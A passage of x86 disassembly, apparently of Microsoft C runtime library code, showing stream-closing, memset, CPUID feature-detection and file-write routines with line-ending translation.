  423d21:	mov    eax,ds:0x433b40
  423d26:	mov    eax,DWORD PTR [eax+esi*4]
  423d29:	test   eax,eax
  423d2b:	je     0x423d71
  423d2d:	test   BYTE PTR [eax+0xc],0x83
  423d31:	je     0x423d43
  423d33:	push   eax
  423d34:	call   0x424b46
  423d39:	pop    ecx
  423d3a:	cmp    eax,0xffffffff
  423d3d:	je     0x423d43
  423d3f:	inc    edi
  423d40:	mov    DWORD PTR [ebp-0x1c],edi
  423d43:	cmp    esi,0x14
  423d46:	jl     0x423d71
  423d48:	mov    eax,ds:0x433b40
  423d4d:	mov    eax,DWORD PTR [eax+esi*4]
  423d50:	add    eax,0x20
  423d53:	push   eax
  423d54:	call   DWORD PTR ds:0x42906c
  423d5a:	mov    eax,ds:0x433b40
  423d5f:	push   DWORD PTR [eax+esi*4]
  423d62:	call   0x41f0cb
  423d67:	pop    ecx
  423d68:	mov    eax,ds:0x433b40
  423d6d:	and    DWORD PTR [eax+esi*4],0x0
  423d71:	inc    esi
  423d72:	jmp    0x423d16
  423d74:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  423d7b:	call   0x423d8b
  423d80:	mov    eax,edi
  423d82:	call   0x422205
  423d87:	ret    
  423d88:	mov    edi,DWORD PTR [ebp-0x1c]
  423d8b:	push   0x1
  423d8d:	call   0x421933
  423d92:	pop    ecx
  423d93:	ret    
  423d94:	push   ebp
  423d95:	mov    ebp,esp
  423d97:	call   DWORD PTR ds:0x4290dc
  423d9d:	push   0x1
  423d9f:	mov    ds:0x432b14,eax
  423da4:	call   0x420c93
  423da9:	push   DWORD PTR [ebp+0x8]
  423dac:	call   0x42219c
  423db1:	cmp    DWORD PTR ds:0x432b14,0x0
  423db8:	pop    ecx
  423db9:	pop    ecx
  423dba:	jne    0x423dc4
  423dbc:	push   0x1
  423dbe:	call   0x420c93
  423dc3:	pop    ecx
  423dc4:	push   0xc0000409
  423dc9:	call   0x422187
  423dce:	pop    ecx
  423dcf:	pop    ebp
  423dd0:	ret    
  423dd1:	push   0x8
  423dd3:	push   0x42dba0
  423dd8:	call   0x4221c0
  423ddd:	mov    esi,0x430af0
  423de2:	cmp    DWORD PTR ds:0x430aec,esi
  423de8:	je     0x423e14
  423dea:	push   0xc
  423dec:	call   0x41fabe
  423df1:	pop    ecx
  423df2:	and    DWORD PTR [ebp-0x4],0x0
  423df6:	push   esi
  423df7:	push   0x430aec
  423dfc:	call   0x422219
  423e01:	pop    ecx
  423e02:	pop    ecx
  423e03:	mov    ds:0x430aec,eax
  423e08:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  423e0f:	call   0x423e1a
  423e14:	call   0x422205
  423e19:	ret    
  423e1a:	push   0xc
  423e1c:	call   0x421933
  423e21:	pop    ecx
  423e22:	ret    
  423e23:	int3   
  423e24:	int3   
  423e25:	int3   
  423e26:	int3   
  423e27:	int3   
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	push   ecx
  423e31:	lea    ecx,[esp+0x8]
  423e35:	sub    ecx,eax
  423e37:	and    ecx,0xf
  423e3a:	add    eax,ecx
  423e3c:	sbb    ecx,ecx
  423e3e:	or     eax,ecx
  423e40:	pop    ecx
  423e41:	jmp    0x424bc0
  423e46:	push   ecx
  423e47:	lea    ecx,[esp+0x8]
  423e4b:	sub    ecx,eax
  423e4d:	and    ecx,0x7
  423e50:	add    eax,ecx
  423e52:	sbb    ecx,ecx
  423e54:	or     eax,ecx
  423e56:	pop    ecx
  423e57:	jmp    0x424bc0
  423e5c:	test   eax,eax
  423e5e:	jne    0x423e66
  423e60:	pxor   xmm0,xmm0
  423e64:	jmp    0x423e77
  423e66:	movd   xmm0,eax
  423e6a:	punpcklbw xmm0,xmm0
  423e6e:	punpcklwd xmm0,xmm0
  423e72:	pshufd xmm0,xmm0,0x0
  423e77:	push   ebx
  423e78:	push   ecx
  423e79:	mov    ebx,ecx
  423e7b:	and    ebx,0xf
  423e7e:	test   ebx,ebx
  423e80:	jne    0x423efa
  423e82:	mov    ebx,edx
  423e84:	and    edx,0x7f
  423e87:	shr    ebx,0x7
  423e8a:	je     0x423ebc
  423e8c:	movdqa XMMWORD PTR [ecx],xmm0
  423e90:	movdqa XMMWORD PTR [ecx+0x10],xmm0
  423e95:	movdqa XMMWORD PTR [ecx+0x20],xmm0
  423e9a:	movdqa XMMWORD PTR [ecx+0x30],xmm0
  423e9f:	movdqa XMMWORD PTR [ecx+0x40],xmm0
  423ea4:	movdqa XMMWORD PTR [ecx+0x50],xmm0
  423ea9:	movdqa XMMWORD PTR [ecx+0x60],xmm0
  423eae:	movdqa XMMWORD PTR [ecx+0x70],xmm0
  423eb3:	lea    ecx,[ecx+0x80]
  423eb9:	dec    ebx
  423eba:	jne    0x423e8c
  423ebc:	test   edx,edx
  423ebe:	je     0x423ef7
  423ec0:	mov    ebx,edx
  423ec2:	shr    ebx,0x4
  423ec5:	je     0x423ed6
  423ec7:	jmp    0x423ecc
  423ec9:	lea    ecx,[ecx+0x0]
  423ecc:	movdqa XMMWORD PTR [ecx],xmm0
  423ed0:	lea    ecx,[ecx+0x10]
  423ed3:	dec    ebx
  423ed4:	jne    0x423ecc
  423ed6:	and    edx,0xf
  423ed9:	je     0x423ef7
  423edb:	mov    ebx,edx
  423edd:	shr    edx,0x2
  423ee0:	je     0x423eec
  423ee2:	movd   DWORD PTR [ecx],xmm0
  423ee6:	lea    ecx,[ecx+0x4]
  423ee9:	dec    edx
  423eea:	jne    0x423ee2
  423eec:	and    ebx,0x3
  423eef:	je     0x423ef7
  423ef1:	mov    BYTE PTR [ecx],al
  423ef3:	inc    ecx
  423ef4:	dec    ebx
  423ef5:	jne    0x423ef1
  423ef7:	pop    eax
  423ef8:	pop    ebx
  423ef9:	ret    
  423efa:	neg    ebx
  423efc:	add    ebx,0x10
  423eff:	sub    edx,ebx
  423f01:	push   edx
  423f02:	mov    edx,ebx
  423f04:	and    edx,0x3
  423f07:	je     0x423f0f
  423f09:	mov    BYTE PTR [ecx],al
  423f0b:	inc    ecx
  423f0c:	dec    edx
  423f0d:	jne    0x423f09
  423f0f:	shr    ebx,0x2
  423f12:	je     0x423f1e
  423f14:	movd   DWORD PTR [ecx],xmm0
  423f18:	lea    ecx,[ecx+0x4]
  423f1b:	dec    ebx
  423f1c:	jne    0x423f14
  423f1e:	pop    edx
  423f1f:	jmp    0x423e82
  423f24:	push   ebp
  423f25:	mov    ebp,esp
  423f27:	and    DWORD PTR ds:0x432b20,0x0
  423f2e:	sub    esp,0x1c
  423f31:	push   ebx
  423f32:	xor    ebx,ebx
  423f34:	inc    ebx
  423f35:	or     DWORD PTR ds:0x431580,ebx
  423f3b:	push   0xa
  423f3d:	call   0x41ef40
  423f42:	test   eax,eax
  423f44:	je     0x424096
  423f4a:	xor    ecx,ecx
  423f4c:	mov    DWORD PTR ds:0x432b20,ebx
  423f52:	xor    eax,eax
  423f54:	cpuid  
  423f56:	push   esi
  423f57:	mov    esi,DWORD PTR ds:0x431580
  423f5d:	push   edi
  423f5e:	lea    edi,[ebp-0x1c]
  423f61:	or     esi,0x2
  423f64:	mov    DWORD PTR [edi],eax
  423f66:	mov    DWORD PTR [edi+0x4],ebx
  423f69:	mov    DWORD PTR [edi+0x8],ecx
  423f6c:	mov    DWORD PTR [edi+0xc],edx
  423f6f:	mov    eax,DWORD PTR [ebp-0x1c]
  423f72:	mov    ecx,DWORD PTR [ebp-0x10]
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	xor    ecx,0x49656e69
  423f7e:	mov    eax,DWORD PTR [ebp-0x14]
  423f81:	xor    eax,0x6c65746e
  423f86:	mov    DWORD PTR ds:0x431580,esi
  423f8c:	or     ecx,eax
  423f8e:	mov    eax,DWORD PTR [ebp-0x18]
  423f91:	xor    eax,0x756e6547
  423f96:	or     ecx,eax
  423f98:	neg    ecx
  423f9a:	push   0x1
  423f9c:	sbb    cl,cl
  423f9e:	pop    eax
  423f9f:	inc    cl
  423fa1:	push   0x0
  423fa3:	pop    ecx
  423fa4:	cpuid  
  423fa6:	mov    DWORD PTR [edi],eax
  423fa8:	mov    DWORD PTR [edi+0x4],ebx
  423fab:	mov    DWORD PTR [edi+0x8],ecx
  423fae:	mov    DWORD PTR [edi+0xc],edx
  423fb1:	mov    ecx,DWORD PTR [ebp-0x14]
  423fb4:	mov    DWORD PTR [ebp-0x8],ecx
  423fb7:	je     0x423ffc
  423fb9:	mov    eax,DWORD PTR [ebp-0x1c]
  423fbc:	and    eax,0xfff3ff0
  423fc1:	cmp    eax,0x106c0
  423fc6:	je     0x423feb
  423fc8:	cmp    eax,0x20660
  423fcd:	je     0x423feb
  423fcf:	cmp    eax,0x20670
  423fd4:	je     0x423feb
  423fd6:	cmp    eax,0x30650
  423fdb:	je     0x423feb
  423fdd:	cmp    eax,0x30660
  423fe2:	je     0x423feb
  423fe4:	cmp    eax,0x30670
  423fe9:	jne    0x423ffc
  423feb:	mov    edi,DWORD PTR ds:0x432b24
  423ff1:	or     edi,0x1
  423ff4:	mov    DWORD PTR ds:0x432b24,edi
  423ffa:	jmp    0x424002
  423ffc:	mov    edi,DWORD PTR ds:0x432b24
  424002:	cmp    DWORD PTR [ebp-0xc],0x7
  424006:	jl     0x42403d
  424008:	push   0x7
  42400a:	xor    ecx,ecx
  42400c:	lea    esi,[ebp-0x1c]
  42400f:	pop    eax
  424010:	cpuid  
  424012:	mov    DWORD PTR [esi],eax
  424014:	mov    eax,esi
  424016:	mov    esi,DWORD PTR ds:0x431580
  42401c:	mov    DWORD PTR [eax+0x4],ebx
  42401f:	mov    DWORD PTR [eax+0x8],ecx
  424022:	mov    ecx,DWORD PTR [ebp-0x8]
  424025:	mov    DWORD PTR [eax+0xc],edx
  424028:	mov    eax,DWORD PTR [ebp-0x18]
  42402b:	test   eax,0x200
  424030:	je     0x42403f
  424032:	or     edi,0x2
  424035:	mov    DWORD PTR ds:0x432b24,edi
  42403b:	jmp    0x42403f
  42403d:	xor    eax,eax
  42403f:	test   ecx,0x100000
  424045:	je     0x424094
  424047:	or     esi,0x4
  42404a:	mov    DWORD PTR ds:0x432b20,0x2
  424054:	mov    DWORD PTR ds:0x431580,esi
  42405a:	test   ecx,0x8000000
  424060:	je     0x424094
  424062:	test   ecx,0x10000000
  424068:	je     0x424094
  42406a:	or     esi,0x8
  42406d:	mov    DWORD PTR ds:0x432b20,0x3
  424077:	mov    DWORD PTR ds:0x431580,esi
  42407d:	test   al,0x20
  42407f:	je     0x424094
  424081:	or     esi,0x20
  424084:	mov    DWORD PTR ds:0x432b20,0x5
  42408e:	mov    DWORD PTR ds:0x431580,esi
  424094:	pop    edi
  424095:	pop    esi
  424096:	xor    eax,eax
  424098:	pop    ebx
  424099:	mov    esp,ebp
  42409b:	pop    ebp
  42409c:	ret    
  42409d:	push   0x14
  42409f:	push   0x42dbc0
  4240a4:	call   0x4221c0
  4240a9:	xor    esi,esi
  4240ab:	mov    DWORD PTR [ebp-0x1c],esi
  4240ae:	mov    edi,DWORD PTR [ebp+0x8]
  4240b1:	cmp    edi,0xfffffffe
  4240b4:	jne    0x4240c6
  4240b6:	call   0x41fb32
  4240bb:	mov    DWORD PTR [eax],0x9
  4240c1:	jmp    0x42417d
  4240c6:	test   edi,edi
  4240c8:	js     0x42416d
  4240ce:	cmp    edi,DWORD PTR ds:0x433be4
  4240d4:	jae    0x42416d
  4240da:	mov    eax,edi
  4240dc:	sar    eax,0x5
  4240df:	mov    DWORD PTR [ebp-0x20],eax
  4240e2:	mov    ebx,edi
  4240e4:	and    ebx,0x1f
  4240e7:	shl    ebx,0x6
  4240ea:	mov    eax,DWORD PTR [eax*4+0x431df8]
  4240f1:	movsx  eax,BYTE PTR [ebx+eax*1+0x4]
  4240f6:	and    eax,0x1
  4240f9:	je     0x42416d
  4240fb:	push   edi
  4240fc:	call   0x424beb
  424101:	pop    ecx
  424102:	mov    DWORD PTR [ebp-0x4],esi
  424105:	mov    eax,DWORD PTR [ebp-0x20]
  424108:	mov    eax,DWORD PTR [eax*4+0x431df8]
  42410f:	test   BYTE PTR [ebx+eax*1+0x4],0x1
  424114:	je     0x42413e
  424116:	push   edi
  424117:	call   0x424cff
  42411c:	pop    ecx
  42411d:	push   eax
  42411e:	call   DWORD PTR ds:0x42901c
  424124:	test   eax,eax
  424126:	jne    0x424130
  424128:	call   DWORD PTR ds:0x429030
  42412e:	mov    esi,eax
  424130:	mov    DWORD PTR [ebp-0x1c],esi
  424133:	test   esi,esi
  424135:	je     0x42414f
  424137:	call   0x422632
  42413c:	mov    DWORD PTR [eax],esi
  42413e:	call   0x41fb32
  424143:	mov    DWORD PTR [eax],0x9
  424149:	or     esi,0xffffffff
  42414c:	mov    DWORD PTR [ebp-0x1c],esi
  42414f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  424156:	call   0x424165
  42415b:	mov    eax,esi
  42415d:	jmp    0x424180
  42415f:	mov    edi,DWORD PTR [ebp+0x8]
  424162:	mov    esi,DWORD PTR [ebp-0x1c]
  424165:	push   edi
  424166:	call   0x424d66
  42416b:	pop    ecx
  42416c:	ret    
  42416d:	call   0x41fb32
  424172:	mov    DWORD PTR [eax],0x9
  424178:	call   0x422622
  42417d:	or     eax,0xffffffff
  424180:	call   0x422205
  424185:	ret    
  424186:	push   0x10
  424188:	push   0x42dbe0
  42418d:	call   0x4221c0
  424192:	xor    ebx,ebx
  424194:	mov    DWORD PTR [ebp-0x1c],ebx
  424197:	mov    esi,DWORD PTR [ebp+0x8]
  42419a:	cmp    esi,0xfffffffe
  42419d:	jne    0x4241b6
  42419f:	call   0x422632
  4241a4:	mov    DWORD PTR [eax],ebx
  4241a6:	call   0x41fb32
  4241ab:	mov    DWORD PTR [eax],0x9
  4241b1:	jmp    0x42426c
  4241b6:	test   esi,esi
  4241b8:	js     0x424255
  4241be:	cmp    esi,DWORD PTR ds:0x433be4
  4241c4:	jae    0x424255
  4241ca:	mov    ebx,esi
  4241cc:	sar    ebx,0x5
  4241cf:	mov    edi,esi
  4241d1:	and    edi,0x1f
  4241d4:	shl    edi,0x6
  4241d7:	mov    eax,DWORD PTR [ebx*4+0x431df8]
  4241de:	movsx  eax,BYTE PTR [eax+edi*1+0x4]
  4241e3:	and    eax,0x1
  4241e6:	jne    0x4241f2
  4241e8:	call   0x422632
  4241ed:	and    DWORD PTR [eax],0x0
  4241f0:	jmp    0x42425c
  4241f2:	push   esi
  4241f3:	call   0x424beb
  4241f8:	pop    ecx
  4241f9:	and    DWORD PTR [ebp-0x4],0x0
  4241fd:	mov    eax,DWORD PTR [ebx*4+0x431df8]
  424204:	test   BYTE PTR [eax+edi*1+0x4],0x1
  424209:	je     0x42421e
  42420b:	push   DWORD PTR [ebp+0x10]
  42420e:	push   DWORD PTR [ebp+0xc]
  424211:	push   esi
  424212:	call   0x424275
  424217:	add    esp,0xc
  42421a:	mov    edi,eax
  42421c:	jmp    0x424234
  42421e:	call   0x41fb32
  424223:	mov    DWORD PTR [eax],0x9
  424229:	call   0x422632
  42422e:	and    DWORD PTR [eax],0x0
  424231:	or     edi,0xffffffff
  424234:	mov    DWORD PTR [ebp-0x1c],edi
  424237:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  42423e:	call   0x42424d
  424243:	mov    eax,edi
  424245:	jmp    0x42426f
  424247:	mov    esi,DWORD PTR [ebp+0x8]
  42424a:	mov    edi,DWORD PTR [ebp-0x1c]
  42424d:	push   esi
  42424e:	call   0x424d66
  424253:	pop    ecx
  424254:	ret    
  424255:	call   0x422632
  42425a:	mov    DWORD PTR [eax],ebx
  42425c:	call   0x41fb32
  424261:	mov    DWORD PTR [eax],0x9
  424267:	call   0x422622
  42426c:	or     eax,0xffffffff
  42426f:	call   0x422205
  424274:	ret    
  424275:	push   ebp
  424276:	mov    ebp,esp
  424278:	mov    eax,0x1af0
  42427d:	call   0x424bc0
  424282:	mov    eax,ds:0x4314e0
  424287:	xor    eax,ebp
  424289:	mov    DWORD PTR [ebp-0x4],eax
  42428c:	and    DWORD PTR [ebp-0x1abc],0x0
  424293:	mov    eax,DWORD PTR [ebp+0x8]
  424296:	mov    ecx,DWORD PTR [ebp+0xc]
  424299:	push   esi
  42429a:	xor    esi,esi
  42429c:	mov    DWORD PTR [ebp-0x1ac8],eax
  4242a2:	push   edi
  4242a3:	xor    edi,edi
  4242a5:	mov    DWORD PTR [ebp-0x1ad0],ecx
  4242ab:	mov    DWORD PTR [ebp-0x1ac0],esi
  4242b1:	cmp    DWORD PTR [ebp+0x10],esi
  4242b4:	jne    0x4242bd
  4242b6:	xor    eax,eax
  4242b8:	jmp    0x424aca
  4242bd:	test   ecx,ecx
  4242bf:	jne    0x4242e0
  4242c1:	call   0x422632
  4242c6:	and    DWORD PTR [eax],esi
  4242c8:	call   0x41fb32
  4242cd:	mov    DWORD PTR [eax],0x16
  4242d3:	call   0x422622
  4242d8:	or     eax,0xffffffff
  4242db:	jmp    0x424aca
  4242e0:	mov    edx,eax
  4242e2:	mov    ecx,eax
  4242e4:	sar    edx,0x5
  4242e7:	and    ecx,0x1f
  4242ea:	shl    ecx,0x6
  4242ed:	mov    DWORD PTR [ebp-0x1ad8],edx
  4242f3:	push   ebx
  4242f4:	mov    edx,DWORD PTR [edx*4+0x431df8]
  4242fb:	mov    DWORD PTR [ebp-0x1adc],ecx
  424301:	mov    bl,BYTE PTR [ecx+edx*1+0x24]
  424305:	add    bl,bl
  424307:	sar    bl,1
  424309:	cmp    bl,0x2
  42430c:	je     0x424313
  42430e:	cmp    bl,0x1
  424311:	jne    0x42433e
  424313:	mov    eax,DWORD PTR [ebp+0x10]
  424316:	not    eax
  424318:	test   al,0x1
  42431a:	jne    0x424338
  42431c:	call   0x422632
  424321:	and    DWORD PTR [eax],esi
  424323:	call   0x41fb32
  424328:	mov    DWORD PTR [eax],0x16
  42432e:	call   0x422622
  424333:	jmp    0x424ac0
  424338:	mov    eax,DWORD PTR [ebp-0x1ac8]
  42433e:	test   BYTE PTR [ecx+edx*1+0x4],0x20
  424343:	je     0x424354
  424345:	push   0x2
  424347:	push   0x0
  424349:	push   0x0
  42434b:	push   eax
  42434c:	call   0x424d9d
  424351:	add    esp,0x10
  424354:	push   DWORD PTR [ebp-0x1ac8]
  42435a:	call   0x4239c8
  42435f:	pop    ecx
  424360:	test   eax,eax
  424362:	je     0x4246b8
  424368:	mov    eax,DWORD PTR [ebp-0x1ad8]
  42436e:	mov    ecx,DWORD PTR [ebp-0x1adc]
  424374:	mov    eax,DWORD PTR [eax*4+0x431df8]
  42437b:	test   BYTE PTR [ecx+eax*1+0x4],0x80
  424380:	je     0x4246b8
  424386:	call   0x42150f
  42438b:	xor    ecx,ecx
  42438d:	mov    eax,DWORD PTR [eax+0x6c]
  424390:	cmp    DWORD PTR [eax+0xa8],ecx
  424396:	lea    eax,[ebp-0x1ae8]
  42439c:	push   eax
  42439d:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4243a3:	sete   cl
  4243a6:	mov    DWORD PTR [ebp-0x1ac4],ecx
  4243ac:	mov    ecx,DWORD PTR [ebp-0x1adc]
  4243b2:	mov    eax,DWORD PTR [eax*4+0x431df8]
  4243b9:	push   DWORD PTR [ecx+eax*1]
  4243bc:	call   DWORD PTR ds:0x429014
  4243c2:	test   eax,eax
  4243c4:	je     0x4246b8
  4243ca:	cmp    DWORD PTR [ebp-0x1ac4],esi
  4243d0:	je     0x4243da
  4243d2:	test   bl,bl
  4243d4:	je     0x4246b8
  4243da:	call   DWORD PTR ds:0x429018
  4243e0:	mov    edx,DWORD PTR [ebp-0x1ad0]
  4243e6:	xor    ecx,ecx
  4243e8:	and    DWORD PTR [ebp-0x1ac8],ecx
  4243ee:	mov    DWORD PTR [ebp-0x1af0],eax
  4243f4:	mov    DWORD PTR [ebp-0x1acc],ecx
  4243fa:	mov    DWORD PTR [ebp-0x1ad4],edx
  424400:	cmp    DWORD PTR [ebp+0x10],ecx
  424403:	jbe    0x424a8a
  424409:	mov    eax,DWORD PTR [ebp-0x1ad4]
  42440f:	xor    edx,edx
  424411:	mov    DWORD PTR [ebp-0x1ac0],edx
  424417:	mov    DWORD PTR [ebp-0x1aec],0xa
  424421:	and    DWORD PTR [ebp-0x1ac4],edi
  424427:	test   bl,bl
  424429:	jne    0x4245dd
  42442f:	mov    dl,BYTE PTR [eax]
  424431:	xor    eax,eax
  424433:	mov    ecx,DWORD PTR [ebp-0x1adc]
  424439:	cmp    dl,0xa
  42443c:	sete   al
  42443f:	mov    DWORD PTR [ebp-0x1ae8],eax
  424445:	mov    eax,DWORD PTR [ebp-0x1ad8]
  42444b:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424452:	mov    DWORD PTR [ebp-0x1ac4],eax
  424458:	cmp    DWORD PTR [ecx+eax*1+0x38],edi
  42445c:	je     0x42447a
  42445e:	mov    al,BYTE PTR [ecx+eax*1+0x34]
  424462:	mov    BYTE PTR [ebp-0xc],al
  424465:	mov    eax,DWORD PTR [ebp-0x1ac4]
  42446b:	mov    BYTE PTR [ebp-0xb],dl
  42446e:	push   0x2
  424470:	and    DWORD PTR [ecx+eax*1+0x38],edi
  424474:	lea    eax,[ebp-0xc]
  424477:	push   eax
  424478:	jmp    0x4244d4
  42447a:	movsx  eax,dl
  42447d:	push   eax
  42447e:	call   0x424d8c
  424483:	pop    ecx
  424484:	test   eax,eax
  424486:	je     0x4244cc
  424488:	mov    eax,DWORD PTR [ebp-0x1ad0]
  42448e:	mov    edx,DWORD PTR [ebp-0x1ad4]
  424494:	sub    eax,edx
  424496:	add    eax,DWORD PTR [ebp+0x10]
  424499:	cmp    eax,0x1
  42449c:	jbe    0x42467d
  4244a2:	push   0x2
  4244a4:	push   edx
  4244a5:	lea    eax,[ebp-0x1acc]
  4244ab:	push   eax
  4244ac:	call   0x424f05
  4244b1:	add    esp,0xc
  4244b4:	cmp    eax,0xffffffff
  4244b7:	je     0x4247c2
  4244bd:	mov    eax,DWORD PTR [ebp-0x1ad4]
  4244c3:	inc    eax
  4244c4:	inc    DWORD PTR [ebp-0x1ac0]
  4244ca:	jmp    0x4244f2
  4244cc:	push   0x1
  4244ce:	push   DWORD PTR [ebp-0x1ad4]
  4244d4:	lea    eax,[ebp-0x1acc]
  4244da:	push   eax
  4244db:	call   0x424f05
  4244e0:	add    esp,0xc
  4244e3:	cmp    eax,0xffffffff
  4244e6:	je     0x4247c2
  4244ec:	mov    eax,DWORD PTR [ebp-0x1ad4]
  4244f2:	xor    ecx,ecx
  4244f4:	inc    eax
  4244f5:	inc    DWORD PTR [ebp-0x1ac0]
  4244fb:	push   ecx
  4244fc:	push   ecx
  4244fd:	push   0x5
  4244ff:	mov    DWORD PTR [ebp-0x1ad4],eax
  424505:	lea    eax,[ebp-0xc]
  424508:	push   eax
  424509:	push   0x1
  42450b:	lea    eax,[ebp-0x1acc]
  424511:	push   eax
  424512:	push   ecx
  424513:	push   DWORD PTR [ebp-0x1af0]
  424519:	call   DWORD PTR ds:0x42905c
  42451f:	mov    DWORD PTR [ebp-0x1ac4],eax
  424525:	test   eax,eax
  424527:	je     0x4247c2
  42452d:	push   0x0
  42452f:	lea    ecx,[ebp-0x1ac8]
  424535:	push   ecx
  424536:	mov    ecx,DWORD PTR [ebp-0x1adc]
  42453c:	push   eax
  42453d:	lea    eax,[ebp-0xc]
  424540:	push   eax
  424541:	mov    eax,DWORD PTR [ebp-0x1ad8]
  424547:	mov    eax,DWORD PTR [eax*4+0x431df8]
  42454e:	push   DWORD PTR [ecx+eax*1]
  424551:	call   DWORD PTR ds:0x429078
  424557:	test   eax,eax
  424559:	je     0x4246ab
  42455f:	mov    esi,DWORD PTR [ebp-0x1ac0]
  424565:	mov    ecx,DWORD PTR [ebp-0x1abc]
  42456b:	add    esi,ecx
  42456d:	mov    eax,DWORD PTR [ebp-0x1ac4]
  424573:	cmp    DWORD PTR [ebp-0x1ac8],eax
  424579:	jl     0x4247c8
  42457f:	cmp    DWORD PTR [ebp-0x1ae8],edi
  424585:	je     0x4245d2
  424587:	mov    ecx,DWORD PTR [ebp-0x1adc]
  42458d:	lea    eax,[ebp-0x1ac8]
  424593:	push   0x0
  424595:	push   eax
  424596:	push   0x1
  424598:	lea    eax,[ebp-0xc]
  42459b:	mov    BYTE PTR [ebp-0xc],0xd
  42459f:	push   eax
  4245a0:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4245a6:	mov    eax,DWORD PTR [eax*4+0x431df8]
  4245ad:	push   DWORD PTR [ecx+eax*1]
  4245b0:	call   DWORD PTR ds:0x429078
  4245b6:	test   eax,eax
  4245b8:	je     0x4246ab
  4245be:	cmp    DWORD PTR [ebp-0x1ac8],0x1
  4245c5:	jl     0x4247c2
  4245cb:	inc    DWORD PTR [ebp-0x1abc]
  4245d1:	inc    esi
  4245d2:	mov    ecx,DWORD PTR [ebp-0x1acc]
  4245d8:	jmp    0x424663
  4245dd:	cmp    bl,0x1
  4245e0:	je     0x4245e7
  4245e2:	cmp    bl,0x2
  4245e5:	jne    0x42461a
  4245e7:	movzx  ecx,WORD PTR [eax]
  4245ea:	xor    edx,edx
  4245ec:	cmp    cx,WORD PTR [ebp-0x1aec]
  4245f3:	mov    DWORD PTR [ebp-0x1acc],ecx
  4245f9:	sete   dl
  4245fc:	add    eax,0x2
  4245ff:	mov    DWORD PTR [ebp-0x1ac4],edx
  424605:	mov    edx,DWORD PTR [ebp-0x1ac0]
  42460b:	add    edx,0x2
  42460e:	mov    DWORD PTR [ebp-0x1ad4],eax
  424614:	mov    DWORD PTR [ebp-0x1ac0],edx
  42461a:	cmp    bl,0x1
  42461d:	je     0x424624
  42461f:	cmp    bl,0x2
  424622:	jne    0x42466f
  424624:	push   ecx
  424625:	call   0x424f1d
  42462a:	pop    ecx
  42462b:	mov    ecx,DWORD PTR [ebp-0x1acc]
  424631:	cmp    ax,cx
  424634:	jne    0x4246ab
  424636:	add    esi,0x2
  424639:	cmp    DWORD PTR [ebp-0x1ac4],edi
  42463f:	je     0x424663
  424641:	push   0xd
  424643:	pop    eax
  424644:	push   eax
  424645:	mov    DWORD PTR [ebp-0x1acc],eax
  42464b:	call   0x424f1d
  424650:	pop    ecx
  424651:	mov    ecx,DWORD PTR [ebp-0x1acc]
  424657:	cmp    ax,cx
  42465a:	jne    0x4246ab
  42465c:	inc    esi
  42465d:	inc    DWORD PTR [ebp-0x1abc]
  424663:	mov    edx,DWORD PTR [ebp-0x1ac0]
  424669:	mov    eax,DWORD PTR [ebp-0x1ad4]
  42466f:	cmp    edx,DWORD PTR [ebp+0x10]
  424672:	jb     0x424421
  424678:	jmp    0x4247c2
  42467d:	mov    ebx,DWORD PTR [ebp-0x1ad8]
  424683:	inc    esi
  424684:	mov    al,BYTE PTR [edx]
  424686:	mov    edx,DWORD PTR [ebp-0x1adc]
  42468c:	mov    ecx,DWORD PTR [ebx*4+0x431df8]
  424693:	mov    BYTE PTR [edx+ecx*1+0x34],al
  424697:	mov    eax,DWORD PTR [ebx*4+0x431df8]
  42469e:	mov    DWORD PTR [edx+eax*1+0x38],0x1
  4246a6:	jmp    0x4247c2
  4246ab:	call   DWORD PTR ds:0x429030
  4246b1:	mov    edi,eax
  4246b3:	jmp    0x4247c2
  4246b8:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4246be:	mov    ecx,DWORD PTR [eax*4+0x431df8]
  4246c5:	mov    eax,DWORD PTR [ebp-0x1adc]
  4246cb:	test   BYTE PTR [eax+ecx*1+0x4],0x80
  4246d0:	je     0x424a4b
  4246d6:	mov    edx,DWORD PTR [ebp-0x1ad0]
  4246dc:	xor    edi,edi
  4246de:	mov    DWORD PTR [ebp-0x1acc],edi
  4246e4:	test   bl,bl
  4246e6:	jne    0x4247fa
  4246ec:	mov    ebx,DWORD PTR [ebp+0x10]
  4246ef:	mov    DWORD PTR [ebp-0x1ac8],edx
  4246f5:	test   ebx,ebx
  4246f7:	je     0x424a8a
  4246fd:	xor    ecx,ecx
  4246ff:	lea    edi,[ebp-0x140c]
  424705:	mov    eax,edx
  424707:	mov    DWORD PTR [ebp-0x1ac4],ecx
  42470d:	sub    eax,DWORD PTR [ebp-0x1ad0]
  424713:	cmp    eax,ebx
  424715:	jae    0x42475b
  424717:	mov    cl,BYTE PTR [edx]
  424719:	inc    edx
  42471a:	inc    eax
  42471b:	mov    BYTE PTR [ebp-0x1ae1],cl
  424721:	cmp    cl,0xa
  424724:	mov    DWORD PTR [ebp-0x1ac8],edx
  42472a:	mov    ecx,DWORD PTR [ebp-0x1ac4]
  424730:	jne    0x42473d
  424732:	inc    DWORD PTR [ebp-0x1abc]
  424738:	mov    BYTE PTR [edi],0xd
  42473b:	inc    edi
  42473c:	inc    ecx
  42473d:	mov    dl,BYTE PTR [ebp-0x1ae1]
  424743:	mov    BYTE PTR [edi],dl
  424745:	inc    edi
  424746:	mov    edx,DWORD PTR [ebp-0x1ac8]
  42474c:	inc    ecx
  42474d:	mov    DWORD PTR [ebp-0x1ac4],ecx
  424753:	cmp    ecx,0x13ff
  424759:	jb     0x424713
  42475b:	mov    ecx,DWORD PTR [ebp-0x1adc]
  424761:	lea    eax,[ebp-0x140c]
  424767:	sub    edi,eax
  424769:	lea    eax,[ebp-0x1ae0]
  42476f:	push   0x0
  424771:	push   eax
  424772:	push   edi
  424773:	lea    eax,[ebp-0x140c]
  424779:	push   eax
  42477a:	mov    eax,DWORD PTR [ebp-0x1ad8]
  424780:	mov    eax,DWORD PTR [eax*4+0x431df8]
  424787:	push   DWORD PTR [ecx+eax*1]
  42478a:	call   DWORD PTR ds:0x429078
  424790:	test   eax,eax
